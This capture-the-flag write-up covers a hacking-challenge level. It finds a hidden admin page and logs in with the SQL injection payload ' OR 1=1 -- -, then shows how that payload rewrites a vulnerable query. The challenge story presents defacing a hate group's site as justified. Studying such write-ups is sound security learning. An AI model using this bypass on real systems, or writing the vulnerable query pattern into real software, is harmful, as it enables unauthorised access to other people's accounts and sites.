## Realistic Mission 2

### Challenge Message

> I have been informed that you have quite admirable hacking skills.
> This racist hate group is using their website to organise a mass gathering.
> We cannot allow such bigoted aggression to happen.
> If you can gain access to their administrator page and post messages to their main page, we would be eternally grateful.



## Objective

Gain access to the administrator panel and obtain the ability to post content to the main page.



## Reconnaissance

Viewing the page source reveals a hidden link:

```html
<center>
    <a href="/missions/realistic/2/update.php">
        <font color="#000000">update</font>
    </a>
</center>
```

Navigating to `/missions/realistic/2/update.php` leads to an administrator login page.



## Attack Surface Analysis

The login form accepts:

* Username
* Password

No visible filtering or sanitisation mechanisms were observed.

Given the context, SQL injection was tested.



## Exploitation

Payload used:

**Username**

```
' OR 1=1 -- -
```

**Password**

```
' OR 1=1 -- -
```

If the backend query resembles:

```sql
SELECT * FROM users 
WHERE username = '$username' 
AND password = '$password';
```

It becomes:

```sql
SELECT * FROM users 
WHERE username = '' OR 1=1 -- - 
AND password = '';
```

`OR 1=1` forces the condition to evaluate as true, bypassing authentication.